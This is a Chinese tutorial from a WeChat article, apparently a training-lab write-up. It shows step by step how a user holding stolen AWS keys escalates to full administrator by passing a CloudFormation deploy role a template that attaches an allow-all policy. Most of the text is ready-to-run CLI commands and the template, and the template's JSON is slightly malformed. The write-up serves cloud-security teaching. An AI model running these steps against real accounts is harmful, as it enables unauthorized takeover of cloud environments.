> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/npDc-jZGgVzTjBQWibkA5w)

**国内云安全培训请点击原文或访问以下链接**

**https://www.yuque.com/u8047536/supvqp/ri4ft0**

  

**前提是已经获取了相关的密钥**

**步骤 1：****将 AWS CLI配置为访问凭证**

  

![图片](https://mmbiz.qpic.cn/mmbiz_png/shVkAyu04IFfrE4xOgibpo4cVX32zGu78ENCqy0B8pwcE1oxNHeRnnlxeE6a2eicrDaxy6RIu7QAiaKaW2yib3pVog/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

**步骤 2：列出附加到用户的 AWS 托管策略**

```
`aws iam list-attached-user-policies --user-name xx` `aws iam list-user-policies --user-name xx`
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/shVkAyu04IEumKETGtGzBicXUAnGIiaxaHMBPAQibHAJhWl2wExic9Fd16FuHLcOqRv2NeGubwjcSn5X7msNbmXXHw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

**步骤 3：尝试在AWS账户上创建用户。**

  

```
aws iam create-user --user-name Bob
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

由于权限不足，用户创建失败

  

**步骤 4： 查看策略权限和详细信息**

  

```
aws iam get-user-policy --user-name xx student --policy-name terraform-20210213071506259200000001
```

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

 xx用户可以  执行各种云表单操作

  

**步骤 5：列出 AWS 账户上可传递给 CloudFormation 服务的角色**

  

```
aws iam list roles
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

**步骤 6： 查看 lab12CFDeploy角色的详细信息**

  

```
`aws iam list-role-policies --role-name lab12CFDeployRole``aws iam get-role-policy --role-name lab12CFDeployRole --policy-name terraform-20210213071506289900000002`
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

**步骤 7：创建包含以下内容的 JSON 文件**

  

```
`{` `"Resources": {` `"EvilTemplate": {` `"Type": "AWS::IAM::Policy",` `"Properties": {` `"PolicyName": "admin_policy",` `"PolicyDocument": {` `"Version": "2012-10-17",` `"Statement": []` `{` `"Effect": "Allow",` `"Action": "*",` `"Resource": "*"` `}` `},` `"Users": [` `"xx"` `]` `}` `}` `}``}`
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

**步骤 8：借助创建的 JSON 文件，在AWS 账户上创建新的cloudformation stack**

  

```
aws cloudformation create-stack --stack-name ad-stack --template-body file://new_policy.json --capabilities CAPABILITY_NAMED_IAM --role-arn arn:aws:iam::1xxxxxxx4:role/lab12CFDeployRole
```

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

**步骤 9：  检查stack信息并检查stack执行事件状态**

  

```
`aws cloudformation describe-stacks --stack-name ad-stack``aws cloudformation describe-stack-events --stack-name ad-stack`
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

已成功执行stack

  

**步骤 10：检查 xx用户的用户策略**

```
aws iam list-user-policies --user-name xx
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

**第 11 步：查看admin_policy的详细信息**

```
aws iam get-user-policy --user-name xx --policy-name admin_policy
```

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

**步骤 12：尝试在 AWS 账户 上创建新用户以验证管理员访问权限**

```
 aws iam create-user --user-name Bob
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

已成功执行特权操作

References:
===========

1.AWSCLI(https://docs.aws.amazon.com/cli/latest/reference/)